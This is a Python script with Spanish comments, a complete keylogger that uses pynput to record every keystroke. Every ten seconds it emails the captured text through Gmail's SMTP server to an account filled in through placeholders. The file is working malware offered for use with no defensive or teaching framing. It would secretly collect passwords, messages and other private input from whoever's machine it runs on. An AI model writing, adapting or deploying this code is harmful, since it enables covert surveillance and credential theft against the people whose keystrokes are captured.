from pynput import keyboard
import logging
import time
import datetime
import smtplib

# Configuraciones
carpeta_destino = 'Ruta_donde_quieres_que_se_guarde_lo_que_se_teclea'
segundos_espera = 10
timeout = time.time() + segundos_espera

# Variable global para el texto tecleado
texto_buffer = ''

# Configurar logging
logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')

# Registrar teclas (solo visibles)
def on_press(key):
    global texto_buffer

    try:
        if key.char is not None:
            texto_buffer += key.char  # Agregar carácter al buffer
    except AttributeError:
        if key == keyboard.Key.space:
            texto_buffer += ' '
        elif key == keyboard.Key.enter:
            texto_buffer += '\n'
        elif key == keyboard.Key.backspace:
            texto_buffer = texto_buffer[:-1]  # Eliminar el último carácter
        # ignorar otras teclas especiales

# Función de timeout
def TimeOut():
    return time.time() > timeout

# Enviar por correo
def EnviarEmail():
    global texto_buffer

    with open(carpeta_destino, 'r+') as f:
        contenido = texto_buffer.strip()

        # Verificar si se presionaron teclas (el archivo no está vacío)
        if contenido == '':
            print("No se detectaron teclas. No se envía correo.")
            return  # Salir de la función si no hay datos

        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        contenido = contenido.replace('Key.space', ' ')
        contenido = contenido.replace('\n', '')
        mensaje = f"Mensaje capturado a las: {fecha}\n{contenido}"

        print(mensaje)

        crearEmail(
            user='tu_correo_electronico',
            passw='tu_contraseña_de_aplicación',
            recep='tu_correo_electronico',
            subj='Nueva captura: ' + fecha,
            body=mensaje
        )

        # Limpiar archivo después del envío
        texto_buffer = ''
        f.seek(0)
        f.truncate()


# Enviar correo
def crearEmail(user, passw, recep, subj, body):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(user, passw)
        email = f"""From: {user}\nTo: {recep}\nSubject: {subj}\n\n{body}"""
        server.sendmail(user, recep, email)
        server.quit()
        print("Correo enviado con éxito.")
    except Exception as e:
        print("Error al enviar correo:", e)

# Iniciar listener
def iniciar_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            global timeout
            if TimeOut():
                EnviarEmail()
                timeout = time.time() + segundos_espera
            time.sleep(1)  # Evitar uso excesivo de CPU

# Ejecutar programa
iniciar_listener()
